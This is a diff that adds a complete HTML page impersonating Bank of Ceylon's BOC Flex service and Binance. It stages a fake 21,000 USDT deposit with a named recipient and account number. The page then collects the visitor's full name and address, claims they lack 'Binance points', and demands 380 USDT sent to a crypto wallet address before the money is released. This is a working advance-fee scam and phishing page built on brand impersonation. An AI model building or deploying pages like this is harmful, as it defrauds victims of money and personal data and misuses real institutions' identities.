@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>BOC Flex | The Future of Banking</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Fonts & Icons -->
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;800&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"/>
+  <style>
+    :root {
+      --primary: #0b2050;
+      --accent: #f7c600;
+      --highlight: #1ee4f7;
+      --white: #fff;
+      --dark: #181a1c;
+      --card-bg: #20273a;
+      --shadow: 0 6px 24px 0 #0002;
+      --radius: 1.2rem;
+      --binance-yellow: #f3ba2f;
+      --binance-dark: #181a20;
+      --email-bg: #20273a;
+      --divider: #2e4067;
+    }
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #0b2050 70%, #3c34a8 100%);
+      font-family: 'Roboto', Arial, sans-serif;
+      color: var(--white);
+      min-height: 100vh;
+      scroll-behavior: smooth;
+    }
+    .header { background: var(--dark); padding: 0.8rem 2rem; display: flex; align-items: center; justify-content: space-between; border-bottom: 3px solid var(--accent); box-shadow: var(--shadow); position: relative; z-index: 2;}
+    .header-left { display: flex; align-items: center; gap: 1.5rem; font-size: 1rem; letter-spacing: 0.02em;}
+    .header-logo { font-family: 'Montserrat', sans-serif; font-weight: 800; font-size: 2rem; color: var(--accent); letter-spacing: 0.1em; display: flex; align-items: center; gap: 0.5em; margin-left: 2em;}
+    .header-logo img { height: 2em; width: auto; margin-right: 0.5em; border-radius: 0.3em; box-shadow: 0 2px 6px #0003; background: #fff; object-fit: contain;}
+    .header-actions button { background: var(--accent); color: var(--primary); border: none; border-radius: 0.6em; padding: 0.5em 1.2em; font-weight: 600; font-size: 1em; cursor: pointer; transition: background 0.16s, color 0.16s, transform 0.08s; box-shadow: 0 2px 8px #0001;}
+    .header-actions button:hover, .cta-btn:active { background: var(--highlight); color: var(--dark); transform: scale(0.97);}
+    .promo-main { display: flex; align-items: stretch; justify-content: center; min-height: 80vh; position: relative; overflow: hidden; padding: 3em 1em 0 1em;}
+    .promo-content { background: var(--card-bg); border-radius: var(--radius); box-shadow: var(--shadow); max-width: 480px; padding: 2.2em 2em 2em 2em; margin: auto; z-index: 1; position: relative; display: flex; flex-direction: column; align-items: center; text-align: center; animation: fadeInUp 1s cubic-bezier(.23,1.03,.57,1.18) both;}
+    @keyframes fadeInUp { from { opacity: 0; transform: translateY(40px);} to { opacity: 1; transform: none;} }
+    .promo-title { font-family: 'Montserrat', Arial, sans-serif; font-size: 2.5em; font-weight: 800; margin-bottom: 0.2em; letter-spacing: 0.04em; text-transform: uppercase; color: var(--white);}
+    .promo-title .flex { color: var(--accent); font-size: 1.2em; letter-spacing: 0.07em;}
+    .boc-flex-logo { display: flex; align-items: center; gap: 0.5em; margin-bottom: 1.5em; justify-content: center;}
+    .boc-flex-logo .boc { font-family: 'Montserrat', sans-serif; font-weight: 800; color: var(--accent); font-size: 1.2em; letter-spacing: 0.05em;}
+    .boc-flex-logo .flex { font-family: 'Montserrat', sans-serif; font-weight: 800; color: var(--highlight); font-size: 2em; letter-spacing: 0.05em; margin-left: 0.2em;}
+    .promo-image { width: 100%; max-width: 350px; border-radius: 1.1em; box-shadow: var(--shadow); margin-bottom: 1.5em; margin-top: 0.7em; border: 2px solid #1e2a56; background: #0003;}
+    .promo-desc { font-size: 1.18em; color: #c9d8f3; margin-bottom: 2.2em; font-weight: 400;}
+    .cta-btn { background: var(--accent); color: var(--primary); font-size: 1.1em; font-weight: bold; border: none; border-radius: 0.5em; padding: 0.9em 2.3em; cursor: pointer; box-shadow: 0 3px 12px #0002; transition: background 0.15s, color 0.15s, transform 0.1s; display: flex; align-items: center; gap: 0.7em; margin: 0 auto; margin-bottom: 0.7em; outline: none; position: relative; overflow: hidden;}
+    .cta-btn:focus-visible { outline: 3px dashed var(--highlight);}
+    .cta-btn:active { transform: scale(0.97);}
+    /* --- Modal Styles --- */
+    .modal-overlay { display: none; position: fixed; z-index: 9999; inset: 0; background: rgba(16, 24, 56, 0.92); justify-content: center; align-items: center; transition: opacity 0.2s;}
+    .modal-overlay.active { display: flex; animation: fadeInModal 0.25s;}
+    @keyframes fadeInModal { from { opacity: 0;} to { opacity: 1;} }
+    .modal { background: var(--binance-dark); color: var(--white); border-radius: var(--radius); box-shadow: 0 8px 32px #161d3e69; max-width: 420px; width: 95vw; padding: 2.1em 2em 1.5em 2em; text-align: center; position: relative; z-index: 10; animation: popIn 0.45s cubic-bezier(.23,1.03,.57,1.18) both;}
+    @keyframes popIn { 0% { opacity: 0; transform: scale(0.9);} 100% { opacity: 1; transform: scale(1);} }
+    .close-modal { position: absolute; top: 1.1em; right: 1.1em; background: transparent; border: none; color: #aaa; font-size: 1.7em; cursor: pointer; z-index: 20; transition: color 0.18s;}
+    .close-modal:hover { color: var(--accent);}
+    .modal .loader { margin: 2em auto 1.5em; border: 6px solid #eef3f9; border-top: 6px solid var(--accent); border-radius: 50%; width: 48px; height: 48px; animation: spin 0.8s linear infinite; display: inline-block;}
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+    .modal-dashboard { padding: 2em 0 0 0; animation: dashboardIn 1s cubic-bezier(.23,1.03,.57,1.18) both;}
+    @keyframes dashboardIn { from { opacity:0; transform: translateY(60px);} to { opacity:1; transform: none;} }
+    .binance-logo { width: 62px; margin-bottom: 1em; animation: fadeInUp 1s 0.1s both;}
+    .dashboard-title { font-size: 1.7em; font-family: 'Montserrat', sans-serif; font-weight: 700; color: var(--binance-yellow); margin-bottom: 0.6em; letter-spacing: 0.03em; display: flex; align-items: center; justify-content: center; gap: 0.5em;}
+    .dashboard-balance { font-size: 2.3em; font-weight: bold; color: var(--binance-yellow); margin-bottom: 0.7em; letter-spacing: 0.02em; animation: fadeInUp 1.2s 0.2s both;}
+    .dashboard-label { font-size: 1.08em; color: #b1bee6; margin-bottom: 1.2em; animation: fadeInUp 1.3s 0.3s both;}
+    /* --- Professional Email Block --- */
+    .email-block { background: var(--email-bg); color: #fff; border-radius: 1em; padding: 2em 1.2em; margin: 1.7em 0 0 0; box-shadow: 0 4px 16px #0003; font-size: 1.08em; text-align: left; word-break: break-word; font-family: 'Roboto', Arial, sans-serif; border: 1.5px solid var(--divider);}
+    .email-header { font-size: 1.1em; font-weight: 700; color: var(--accent); margin-bottom: 0.7em; border-bottom: 1px solid var(--divider); padding-bottom: 0.5em;}
+    .email-meta { margin: 0.6em 0 1.2em 0; font-size: 0.97em; color: #e2e2e2;}
+    .email-amount { font-size: 1.18em; font-weight: 700; color: var(--highlight);}
+    .email-divider { border-top: 1.5px solid var(--divider); margin: 1.2em 0;}
+    .email-details strong { color: var(--binance-yellow);}
+    .email-footer { margin-top: 1.3em; color: #ccc; font-size: 0.98em;}
+    .email-btn-row { text-align: right; margin-top: 1.2em;}
+    .email-btn { background: var(--binance-yellow); color: var(--binance-dark); border: none; padding: 0.55em 1.5em; font-weight: 600; border-radius: 0.4em; cursor: pointer; box-shadow: 0 2px 8px #0002; transition: background 0.16s, color 0.16s, transform 0.08s;}
+    .email-btn:hover { background: var(--accent); color: var(--dark);}
+    /* --- Fireworks --- */
+    #fireworks-canvas { pointer-events: none; position: fixed; left: 0; top: 0; width: 100vw; height: 100vh; z-index: 99999; display:none;}
+    /* --- Confirmation Form Modal --- */
+    .form-modal { background: var(--card-bg); color: var(--white); border-radius: var(--radius); box-shadow: 0 8px 32px #161d3e69; max-width: 420px; width: 95vw; padding: 2.1em 2em 1.5em 2em; text-align: left; position: relative;}
+    .form-label { display:block; margin: 1em 0 0.3em 0; font-weight: 500;}
+    .form-input { width:100%; padding: 0.6em; border-radius:0.4em; border: 1px solid #333; background: #232b41; color: #fff; font-size:1em;}
+    .form-confirm { margin-top: 1.5em; background: var(--binance-yellow); color: var(--primary); border: none; border-radius: 0.5em; padding: 0.7em 1.7em; font-weight: bold; font-size: 1.1em; cursor: pointer; transition: 0.15s;}
+    .form-confirm:hover { background: var(--accent);}
+    .form-check { vertical-align: middle; margin-right: 0.4em;}
+    /* --- Loader Bar --- */
+    .loader-bar { width: 100%; background: #232b41; border-radius: 0.4em; margin-top: 2em; height: 1.2em; overflow: hidden;}
+    .loader-bar-fill { height: 100%; background: linear-gradient(90deg, var(--highlight), var(--accent)); width: 0%; transition: width 0.2s; border-radius: 0.4em;}
+    .loader-bar-label { text-align: center; font-weight: 600; margin-top: 0.5em; }
+    /* --- Points Modal --- */
+    .points-modal { background: var(--card-bg); color: #fff; border-radius: var(--radius); box-shadow: 0 8px 32px #161d3e69; max-width: 400px; width: 95vw; padding: 2em 2em 1.3em 2em; text-align: center; position: relative;}
+    .points-title { font-size: 1.2em; font-weight: 700; color: var(--accent); margin-bottom: 1.5em;}
+    .store-list { display: flex; flex-wrap: wrap; gap: 1em; justify-content: center;}
+    .store-item { padding: 1em 1.1em; border-radius: 0.5em; background: #232b41; color: #fff; border: 2px solid #232b41; cursor: pointer; min-width: 110px; text-align: center; font-weight: 600; font-size: 1.08em; margin-bottom: 0.7em; transition: border 0.18s, background 0.18s;}
+    .store-item.online { border: 2px solid var(--accent); background: #282d3c;}
+    .store-item.offline { border: 2px solid #444; color: #bbb; background: #232b41; cursor: not-allowed;}
+    .store-item:active { transform: scale(0.97);}
+    .store-status { font-size: 0.92em; margin-top: 0.4em;}
+    /* --- Store Payment Modal --- */
+    .store-pay-modal { background: var(--card-bg); color: #fff; border-radius: var(--radius); box-shadow: 0 8px 32px #161d3e69; max-width: 400px; width: 95vw; padding: 2.2em 2em 1.5em 2em; text-align: left; position: relative;}
+    .points-needed { font-size: 1.13em; color: var(--accent); margin-bottom: 0.7em;}
+    .payment-row { margin: 1em 0;}
+    .payment-label { font-weight: 600; color: var(--highlight);}
+    .payment-value { font-size: 1.16em;}
+    .copy-btn { background: var(--highlight); color: var(--primary); border: none; padding: 0.45em 1.2em; font-weight: 600; border-radius: 0.4em; cursor: pointer; margin-left: 1em;}
+    .copy-btn:hover { background: var(--accent);}
+    .awaiting-row {display: flex; align-items: center; margin-top: 1em; font-weight: 600; color: var(--highlight);}
+    .spinner { border: 4px solid #eee; border-top: 4px solid var(--highlight); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin-left: 0.7em;}
+    /* --- Responsive --- */
+    @media (max-width: 700px) {
+      .header { padding: 0.8rem 1rem; flex-direction: column; align-items: flex-start; gap: 0.7em;}
+      .promo-content { padding: 1.2em 0.3em 1.1em 0.3em;}
+      .promo-title { font-size: 1.4em;}
+      .modal, .form-modal, .points-modal, .store-pay-modal { padding: 1.3em 0.5em 1em 0.5em;}
+    }
+  </style>
+</head>
+<body>
+  <!-- Header -->
+  <header class="header">
+    <div class="header-left">
+      <div class="header-logo">
+        <img src="logo.png" alt="BOC Logo">
+        <span>BOC</span>
+      </div>
+    </div>
+    <div class="header-actions">
+      <button>Apply Online</button>
+      <button>Online Banking</button>
+    </div>
+  </header>
+  <!-- Main Promo Section -->
+  <main class="promo-main">
+    <section class="promo-content" tabindex="0">
+      <div class="promo-title">
+        MY LIFE<br>
+        <span class="flex">MY FLEX</span>
+      </div>
+      <div class="boc-flex-logo">
+        <span class="boc">BOC</span>
+        <span class="flex">Flex</span>
+      </div>
+      <img class="promo-image" src="image1.jpg" alt="BOC Flex banking app promotion">
+      <div class="promo-desc">
+        Experience the tech revolution in banking with BOC Flex.
+      </div>
+      <button class="cta-btn" id="accessPaymentBtn">
+        Access my payment <i class="fas fa-arrow-right"></i>
+      </button>
+    </section>
+  </main>
+  <!-- Fireworks Canvas -->
+  <canvas id="fireworks-canvas"></canvas>
+  <!-- Modal Overlay -->
+  <div class="modal-overlay" id="modalOverlay" aria-modal="true" role="dialog">
+    <!-- Loading Modal -->
+    <div class="modal" id="modalLoading">
+      <button class="close-modal" aria-label="Close" id="closeModalBtn" style="display:none;">&times;</button>
+      <div class="loader"></div>
+      <h2>
+        <span style="color:var(--accent)">BOC BANK</span> IS LINKING WITH <span style="color:#f3ba2f">BINANCE.com</span>
+      </h2>
+    </div>
+    <!-- Dashboard Modal -->
+    <div class="modal modal-dashboard" id="modalDashboard" style="display:none;">
+      <button class="close-modal" aria-label="Close" id="closeDashboardBtn">&times;</button>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/9/98/Binance_Logo.png" alt="Binance Logo" class="binance-logo"/>
+      <div class="dashboard-title"><i class="fas fa-wallet"></i> Binance Payment Dashboard</div>
+      <div class="dashboard-balance">21,000 <span style="font-size:0.6em;">USDT</span></div>
+      <div class="dashboard-label">Your payment is being held securely.</div>
+      <div class="email-block">
+        <div class="email-header">Payment Confirmation - Binance to BOC</div>
+        <div class="email-meta">Date: <span id="email-date"></span> | Ref: <span style="color:var(--highlight);">#TXN902174</span></div>
+        <div class="email-divider"></div>
+        <div class="email-details">
+          <p>
+            <span class="email-amount">Amount: <strong>6,326,880.00 LKR</strong> (<strong>21,000 USDT</strong>)</span>
+          </p>
+          <p>
+            <strong>Sender:</strong> Binance.com<br>
+            <strong>Recipient Bank:</strong> Bank of Ceylon (BOC)<br>
+            <strong>Account Number:</strong> 90106685<br>
+            <strong>Account Name:</strong> T.M.D.S.Talawatta<br>
+            <strong>Bank Branch:</strong> Kahawatta
+          </p>
+          <div class="email-divider"></div>
+          <p>
+            Dear <span style="color:var(--accent);font-weight:600;">T.M.D.S.Talawatta</span>,
+            <br>
+            We are pleased to inform you that your deposit request has been successfully processed by Binance. The above amount has been credited to your nominated BOC Flex account.<br>
+            If you have any questions, please contact our 24/7 support.
+          </p>
+        </div>
+        <div class="email-footer">
+          Sincerely,<br>
+          Binance Global Payments Team<br>
+          <span style="color:var(--binance-yellow);font-weight:700;">BOC Flex</span> | The Future of Banking
+        </div>
+        <div class="email-btn-row">
+          <button class="email-btn" id="viewDepositBtn"><i class="fas fa-eye"></i> View Deposit</button>
+        </div>
+      </div>
+    </div>
+    <!-- Confirmation Form Modal -->
+    <div class="form-modal" id="formModal" style="display:none;">
+      <button class="close-modal" aria-label="Close" id="closeFormBtn">&times;</button>
+      <h2 style="color:var(--highlight);margin-bottom:0.7em;">Confirm Deposit</h2>
+      <form id="depositForm">
+        <label class="form-label" for="userName">Full Name</label>
+        <input class="form-input" id="userName" name="userName" autocomplete="name" required placeholder="Enter your full name">
+        <label class="form-label" for="userAddress">Address</label>
+        <input class="form-input" id="userAddress" name="userAddress" autocomplete="address" required placeholder="Enter your address">
+        <div style="margin-top:1.3em;">
+          <input type="checkbox" id="confirmCheck" class="form-check" required>
+          <label for="confirmCheck" style="font-size:0.96em;">
+            I hereby confirm that my <span style="color:var(--highlight);font-weight:600;">21,000 USDT</span> has been successfully received and request it be forwarded to my Binance account permanently.
+          </label>
+        </div>
+        <button type="submit" class="form-confirm" id="confirmDepositBtn"><i class="fas fa-check"></i> Submit Confirmation</button>
+      </form>
+    </div>
+    <!-- Loader Modal -->
+    <div class="modal" id="loaderBarModal" style="display:none;">
+      <h3 style="margin-bottom:1.2em;">Processing Confirmation...</h3>
+      <div class="loader-bar"><div class="loader-bar-fill" id="loaderBarFill"></div></div>
+      <div class="loader-bar-label" id="loaderBarLabel">0%</div>
+    </div>
+    <!-- Not Enough Points Modal -->
+    <div class="points-modal" id="notEnoughPointsModal" style="display:none;">
+      <button class="close-modal" aria-label="Close" id="closePointsBtn">&times;</button>
+      <div class="points-title">Not enough BINANCE POINTS to carry out your request.</div>
+      <button class="email-btn" id="getPointsBtn"><i class="fas fa-store"></i> GET POINTS</button>
+    </div>
+    <!-- Points Store Modal -->
+    <div class="points-modal" id="pointsStoreModal" style="display:none;">
+      <button class="close-modal" aria-label="Close" id="closeStoreBtn">&times;</button>
+      <div class="points-title">Select a Store to Get BINANCE Points</div>
+      <div class="store-list">
+        <div class="store-item online" data-store="1">Store 1<br><span class="store-status" style="color:var(--highlight)">Online</span></div>
+        <div class="store-item offline" data-store="2">Store 2<br><span class="store-status">Offline</span></div>
+        <div class="store-item offline" data-store="3">Store 3<br><span class="store-status">Out of Limit</span></div>
+        <div class="store-item offline" data-store="4">Store 4<br><span class="store-status">Offline</span></div>
+        <div class="store-item offline" data-store="5">Store 5<br><span class="store-status">Out of Limit</span></div>
+        <div class="store-item offline" data-store="6">Store 6<br><span class="store-status">Offline</span></div>
+        <div class="store-item offline" data-store="7">Store 7<br><span class="store-status">Out of Limit</span></div>
+      </div>
+    </div>
+    <!-- Store Payment Modal -->
+    <div class="store-pay-modal" id="storePayModal" style="display:none;">
+      <button class="close-modal" aria-label="Close" id="closePayModalBtn">&times;</button>
+      <h3 style="color:var(--binance-yellow);margin-bottom:1em;"><i class="fas fa-coins"></i> Get Points</h3>
+      <div class="points-needed">Points Needed: <span style="color:var(--accent);font-weight:700;">1000/1000</span></div>
+      <div class="payment-row">
+        <span class="payment-label">Payment Amount:</span>
+        <span class="payment-value" style="color:var(--highlight);font-weight:700;margin-left:0.8em;">380 USDT</span>
+      </div>
+      <div class="payment-row">
+        <span class="payment-label">Payment Address:</span>
+        <span id="paymentAddress" style="font-size:1.08em;word-break:break-all;">0x1234abcd5678ef9012345678abcdef12345678abc</span>
+        <button class="copy-btn" id="copyPayAddressBtn"><i class="fas fa-copy"></i> Copy</button>
+      </div>
+      <div class="awaiting-row" id="awaitingDepositRow" style="display:none;">
+        Awaiting deposit... <span class="spinner"></span>
+      </div>
+    </div>
+  </div>
+  <script>
+    // Date for email
+    document.getElementById('email-date').textContent = new Date().toLocaleDateString();
+
+    // Modal logic
+    const accessBtn = document.getElementById('accessPaymentBtn');
+    const modalOverlay = document.getElementById('modalOverlay');
+    const modalLoading = document.getElementById('modalLoading');
+    const modalDashboard = document.getElementById('modalDashboard');
+    const closeModalBtn = document.getElementById('closeModalBtn');
+    const closeDashboardBtn = document.getElementById('closeDashboardBtn');
+    const fireworks = document.getElementById('fireworks-canvas');
+    const viewDepositBtn = document.getElementById('viewDepositBtn');
+    const formModal = document.getElementById('formModal');
+    const closeFormBtn = document.getElementById('closeFormBtn');
+    const loaderBarModal = document.getElementById('loaderBarModal');
+    const loaderBarFill = document.getElementById('loaderBarFill');
+    const loaderBarLabel = document.getElementById('loaderBarLabel');
+    const depositForm = document.getElementById('depositForm');
+    const notEnoughPointsModal = document.getElementById('notEnoughPointsModal');
+    const closePointsBtn = document.getElementById('closePointsBtn');
+    const getPointsBtn = document.getElementById('getPointsBtn');
+    const pointsStoreModal = document.getElementById('pointsStoreModal');
+    const closeStoreBtn = document.getElementById('closeStoreBtn');
+    const storeItems = document.querySelectorAll('.store-item');
+    const storePayModal = document.getElementById('storePayModal');
+    const closePayModalBtn = document.getElementById('closePayModalBtn');
+    const copyPayAddressBtn = document.getElementById('copyPayAddressBtn');
+    const awaitingDepositRow = document.getElementById('awaitingDepositRow');
+
+    // Show loading modal then dashboard with fireworks
+    accessBtn.addEventListener('click', () => {
+      modalOverlay.classList.add('active');
+      hideAllModals();
+      modalLoading.style.display = 'block';
+      setTimeout(() => {
+        modalLoading.style.display = 'none';
+        modalDashboard.style.display = 'block';
+        closeDashboardBtn.focus();
+        showFireworks();
+      }, 4000);
+    });
+
+    // Close buttons
+    closeDashboardBtn.onclick = closeAll;
+    closeFormBtn.onclick = closeAll;
+    closePointsBtn.onclick = closeAll;
+    closeStoreBtn.onclick = closeAll;
+    closePayModalBtn.onclick = closeAll;
+    // Clicking overlay closes if dashboard or form is up
+    modalOverlay.onclick = function(e) {
+      if(e.target === modalOverlay) closeAll();
+    };
+    function closeAll() {
+      modalOverlay.classList.remove('active');
+      hideAllModals();
+      stopFireworks();
+    }
+    function hideAllModals() {
+      [modalLoading, modalDashboard, formModal, loaderBarModal, notEnoughPointsModal, pointsStoreModal, storePayModal].forEach(m=>{m.style.display='none';});
+      awaitingDepositRow.style.display = 'none';
+    }
+
+    // View Deposit Button (show form)
+    viewDepositBtn.onclick = () => {
+      hideAllModals();
+      formModal.style.display = 'block';
+      setTimeout(()=>{document.getElementById('userName').focus();},120);
+    };
+    // Form submission
+    depositForm.onsubmit = function(e) {
+      e.preventDefault();
+      hideAllModals();
+      loaderBarModal.style.display = 'block';
+      let percent = 0;
+      loaderBarFill.style.width = '0%';
+      loaderBarLabel.textContent = '0%';
+      let interval = setInterval(()=>{
+        percent += Math.random()*9 + 2;
+        if(percent>100) percent=100;
+        loaderBarFill.style.width = percent + '%';
+        loaderBarLabel.textContent = Math.floor(percent) + '%';
+        if(percent>=100){
+          clearInterval(interval);
+          setTimeout(()=>{
+            loaderBarModal.style.display = 'none';
+            notEnoughPointsModal.style.display = 'block';
+            closePointsBtn.focus();
+          }, 500);
+        }
+      }, 90);
+    };
+
+    // Get Points
+    getPointsBtn.onclick = () => {
+      hideAllModals();
+      pointsStoreModal.style.display = 'block';
+    };
+
+    // Store selection
+    storeItems.forEach(item=>{
+      item.onclick = function(){
+        if(item.classList.contains('online')){
+          hideAllModals();
+          storePayModal.style.display = 'block';
+        } else {
+          item.classList.add('shake');
+          alert('Store is Offline or Out of Limit');
+          setTimeout(()=>item.classList.remove('shake'),400);
+        }
+      }
+    });
+
+    // Copy address and show awaiting
+    copyPayAddressBtn.onclick = function(){
+      const addr = document.getElementById('paymentAddress').textContent;
+      navigator.clipboard.writeText(addr);
+      awaitingDepositRow.style.display = 'flex';
+    };
+
+    // Fireworks Animation
+    let fwRunning = false, fwTimer = null;
+    function showFireworks(){
+      fireworks.style.display = 'block'; fwRunning=true;
+      let ctx = fireworks.getContext('2d');
+      fireworks.width = window.innerWidth; fireworks.height = window.innerHeight;
+      let particles = [];
+      function launch(){
+        let x = Math.random()*fireworks.width*.8 + fireworks.width*.1, y=fireworks.height*.7+Math.random()*fireworks.height*.15, c = `hsl(${Math.random()*360},90%,60%)`;
+        for(let i=0;i<80;i++){
+          let angle = Math.random()*2*Math.PI, speed = Math.random()*8+6;
+          particles.push({x:x,y:y,vx:Math.cos(angle)*speed,vy:Math.sin(angle)*speed,alpha:1,color:c});
+        }
+      }
+      for(let i=0;i<4;i++) setTimeout(launch, 400*i);
+      function draw(){
+        ctx.clearRect(0,0,fireworks.width,fireworks.height);
+        for(let p of particles){
+          ctx.globalAlpha = p.alpha;
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, 2.2, 0, 2*Math.PI);
+          ctx.fillStyle = p.color; ctx.fill();
+          p.x += p.vx;
+          p.y += p.vy;
+          p.vy += 0.15;
+          p.alpha -= 0.009;
+        }
+        particles = particles.filter(p=>p.alpha>0.05);
+        if(fwRunning && (particles.length>0 || fwTimer)){
+          requestAnimationFrame(draw);
+        }
+      }
+      draw();
+      fwTimer = setTimeout(()=>{stopFireworks();}, 3400);
+    }
+    function stopFireworks(){ fwRunning=false; fireworks.style.display='none'; if(fwTimer) clearTimeout(fwTimer); fwTimer=null; }
+
+    // Accessibility: trap focus inside modals
+    document.addEventListener('keydown', function(e){
+      if(modalOverlay.classList.contains('active')) {
+        if(e.key === 'Escape'){ closeAll(); }
+        if(e.key === 'Tab'){
+          let focusable = modalOverlay.querySelectorAll('button, [tabindex="0"], input, select, textarea');
+          let first = focusable[0], last = focusable[focusable.length-1];
+          if(e.shiftKey ? document.activeElement===first : document.activeElement===last){
+            e.preventDefault(); (e.shiftKey ? last : first).focus();
+          }
+        }
+      }
+    });
+  </script>
+</body>
+</html>
